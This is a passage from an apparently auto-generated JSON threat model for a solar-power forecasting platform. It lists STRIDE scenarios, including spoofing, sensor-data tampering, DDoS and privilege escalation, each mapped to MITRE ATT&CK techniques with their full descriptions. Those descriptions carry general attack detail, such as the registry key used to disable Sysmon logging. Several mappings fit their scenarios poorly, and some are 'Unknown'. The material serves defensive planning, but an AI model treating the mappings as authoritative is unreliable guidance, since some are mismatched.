                    "Condition": "Valid when anomaly detection for sensor data is slow or non-existent."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data and corruption of sensor data.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "sensor network",
                "false data injection",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the identity of the Receiver to intercept data from the data logger.",
            "Assumptions": [
                {
                    "Assumption": "No mutual authentication between the Data Logger and the Receiver.",
                    "Role": "Attacker",
                    "Condition": "Assumes data logger trusts any device claiming to be the Receiver."
                },
                {
                    "Assumption": "Network communications are not encrypted.",
                    "Role": "System",
                    "Condition": "Valid if communication channels are insecure."
                },
                {
                    "Assumption": "The attacker has access to network communication paths.",
                    "Role": "Attacker",
                    "Condition": "Valid if attack can access or route network packets."
                }
            ],
            "Potential Impact": "Unauthorized data interception and potential corruption.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "data interception",
                "network",
                "communication spoofing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker can fake the identity of an employee to gain access to the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication mechanisms for dashboard access.",
                    "Role": "Attacker",
                    "Condition": "Valid if strong authentication methods like 2FA are not implemented."
                },
                {
                    "Assumption": "The attacker has acquired legitimate user credentials through phishing or other means.",
                    "Role": "Attacker",
                    "Condition": "Assumes successful social engineering or credential theft."
                },
                {
                    "Assumption": "System does not monitor for abnormal access patterns.",
                    "Role": "System",
                    "Condition": "Valid when user behavior monitoring is not in place."
                }
            ],
            "Potential Impact": "Unauthorized system access and potential disruption.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "stolen credentials",
                "dashboard",
                "access control"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with data during transmission from the Data Logger to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "System",
                    "Condition": "Valid if encryption mechanisms are not applied."
                },
                {
                    "Assumption": "The attacker has access to the transmission path.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker can intercept network traffic."
                },
                {
                    "Assumption": "System does not employ integrity checks on received data.",
                    "Role": "System",
                    "Condition": "Valid if data integrity verification is not in place."
                }
            ],
            "Potential Impact": "Corruption of transmission data.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "network traffic",
                "transmission",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An authorized user might manipulate the AI/ML models to produce inaccurate predictions.",
            "Assumptions": [
                {
                    "Assumption": "Users with access to models can alter training data or model parameters.",
                    "Role": "Insider",
                    "Condition": "Valid if access controls are weak."
                },
                {
                    "Assumption": "There is no effective auditing of changes to models or training data.",
                    "Role": "System",
                    "Condition": "Valid if auditing and logging are not adequately implemented."
                },
                {
                    "Assumption": "The system does not employ validation checks against anomalous training activities.",
                    "Role": "System",
                    "Condition": "Valid if model training activities are not monitored."
                }
            ],
            "Potential Impact": "Corruption of AI/ML model predictions.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "model manipulation",
                "AI/ML",
                "training data tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could alter metadata related to solar power plants.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls over metadata management.",
                    "Role": "Attacker",
                    "Condition": "Valid if permissions for metadata alteration are loosely controlled."
                },
                {
                    "Assumption": "No audit logs for metadata changes.",
                    "Role": "System",
                    "Condition": "Valid if system does not log metadata modifications."
                },
                {
                    "Assumption": "Metadata is not subject to validation or consistency checks.",
                    "Role": "System",
                    "Condition": "Valid if metadata is managed without verification."
                }
            ],
            "Potential Impact": "Tampering with solar plant metadata leading to inaccurate predictions.",
            "MITRE ATT&CK Keywords": [
                "metadata tampering",
                "access control",
                "unauthorized changes",
                "system integrity"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies making changes to the model parameters.",
            "Assumptions": [
                {
                    "Assumption": "No audit trail for actions performed by users.",
                    "Role": "System",
                    "Condition": "Valid without logging mechanisms."
                },
                {
                    "Assumption": "Insufficient monitoring of user activities on the TOREADOR platform.",
                    "Role": "System",
                    "Condition": "Valid without activity monitoring."
                },
                {
                    "Assumption": "Weak authentication does not uniquely identify users.",
                    "Role": "System",
                    "Condition": "Valid if user accounts are shared or poorly managed."
                }
            ],
            "Potential Impact": "Reduced accountability and inability to trace changes.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "lack of auditing",
                "accountability",
                "user activity"
            ],
            "mitre_technique": {
                "name": "Event Triggered Execution",
                "description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ",
                "id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
                "technique_id": "T1546"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could deny sending manipulated data from a compromised sensor.",
            "Assumptions": [
                {
                    "Assumption": "No logging of data sources and transmission details.",
                    "Role": "System",
                    "Condition": "Valid if data source tracking is absent."
                },
                {
                    "Assumption": "Incomplete or insufficient logging on the data logger.",
                    "Role": "System",
                    "Condition": "Valid when data loggers do not record transmission events comprehensively."
                },
                {
                    "Assumption": "Weak forensic capabilities on the data received by the receiver.",
                    "Role": "System",
                    "Condition": "Valid if there are no procedures for validating data authenticity."
                }
            ],
            "Potential Impact": "Compromised data integrity and accountability issues.",
            "MITRE ATT&CK Keywords": [
                "data manipulation",
                "logging deficiency",
                "sensor network",
                "compromised data"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "System operators deny responsibility for power flow adjustments leading to inefficiencies.",
            "Assumptions": [
                {
                    "Assumption": "Lack of detailed action logging in the system\u2019s dashboard.",
                    "Role": "System",
                    "Condition": "Valid if dashboard interactions are not logged."
                },
                {
                    "Assumption": "No distinct user authentication for each operator.",
                    "Role": "System",
                    "Condition": "Valid if shared user accounts are used."
                },
                {
                    "Assumption": "Power flow adjustments are not systematically recorded.",
                    "Role": "System",
                    "Condition": "Valid if implementation lacks automatic logging of power flow changes."
                }
            ],
            "Potential Impact": "Reduced system efficiency and accountability.",
            "MITRE ATT&CK Keywords": [
                "insufficient logging",
                "power flow",
                "operator actions",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data could be intercepted during transmission from sensors to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "System",
                    "Condition": "Valid if encryption is not used in data transmission."
                },
                {
                    "Assumption": "The attacker has access to the network communication path.",
                    "Role": "Attacker",
                    "Condition": "Valid if network communications are accessible."
                },
                {
                    "Assumption": "Weak or no network segregation.",
                    "Role": "System",
                    "Condition": "Valid if sensitive communication channels are not isolated."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive sensor data.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "network communication",
                "sensor data",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could access sensitive data stored on the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate data access controls on the TOREADOR platform.",
                    "Role": "System",
                    "Condition": "Valid if access control policies are poorly implemented."
                },
                {
                    "Assumption": "No encryption for data at rest on the TOREADOR platform.",
                    "Role": "System",
                    "Condition": "Valid if data is stored in plaintext."
                },
                {
                    "Assumption": "Weak incident detection mechanisms on the platform.",
                    "Role": "System",
                    "Condition": "Valid if unauthorized access is not monitored."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive stored data.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "cloud platform",
                "unauthorized access",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized user accesses sensitive predictions and insights on the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication and authorization mechanisms for Dashboard access.",
                    "Role": "System",
                    "Condition": "Valid if robust user authentication and authorization are not implemented."
                },
                {
                    "Assumption": "The attacker has legitimate user credentials.",
                    "Role": "Attacker",
                    "Condition": "Valid if credentials are obtained through phishing or other means."
                },
                {
                    "Assumption": "No effective logging or monitoring of Dashboard access.",
                    "Role": "System",
                    "Condition": "Valid if access to the Dashboard is not logged or monitored."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "unauthorized access",
                "dashboard",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack on the Receiver could disrupt data collection from the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Receiver is accessible from the internet and not protected by mitigative mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Valid if system exposure to public networks is unmitigated."
                },
                {
                    "Assumption": "No rate limiting or perimeter security is in place.",
                    "Role": "System",
                    "Condition": "Valid if there are insufficient defenses against traffic spikes."
                },
                {
                    "Assumption": "Attacker can marshal significant resources for a DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has access to botnet or similar resources."
                }
            ],
            "Potential Impact": "Disruption to system availability.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network congestion",
                "service disruption",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could trigger excessive load on AI/ML model training leading to resource exhaustion.",
            "Assumptions": [
                {
                    "Assumption": "No resource quotas or limits for AI/ML model training jobs.",
                    "Role": "System",
                    "Condition": "Valid if control mechanisms for resource allocation are missing."
                },
                {
                    "Assumption": "Unrestricted access to the training environment.",
                    "Role": "Attacker",
                    "Condition": "Valid if access controls and monitoring are weak."
                },
                {
                    "Assumption": "System lacks monitoring for abnormal training activities.",
                    "Role": "System",
                    "Condition": "Valid if there are no mechanisms to detect and halt misuse."
                }
            ],
            "Potential Impact": "Resource exhaustion leading to denial of service.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "AI/ML",
                "training abuse",
                "availability"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider plugging in malware into the Data Logger causing it to crash.",
            "Assumptions": [
                {
                    "Assumption": "Physical security measures to prevent unauthorized access are weak.",
                    "Role": "System",
                    "Condition": "Valid if attackers can gain physical access to hardware."
                },
                {
                    "Assumption": "No malware detection mechanisms on the Data Logger.",
                    "Role": "System",
                    "Condition": "Valid if Data Logger lacks comprehensive security software."
                },
                {
                    "Assumption": "Attacker has the necessary knowledge and tools to exploit the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has technical capability."
                }
            ],
            "Potential Impact": "Device failure causing interruption in data collection.",
            "MITRE ATT&CK Keywords": [
                "malware infection",
                "insider threat",
                "device crash",
                "data collection"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the TOREADOR platform to gain admin privileges.",
            "Assumptions": [
                {
                    "Assumption": "Presence of unpatched vulnerabilities on the TOREADOR platform.",
                    "Role": "System",
                    "Condition": "Valid if system is not regularly updated."
                },
                {
                    "Assumption": "Weak segregation of admin and user privileges.",
                    "Role": "System",
                    "Condition": "Valid if user roles are not effectively separated."
                },
                {
                    "Assumption": "No effective logging or detection mechanisms for privilege escalation.",
                    "Role": "System",
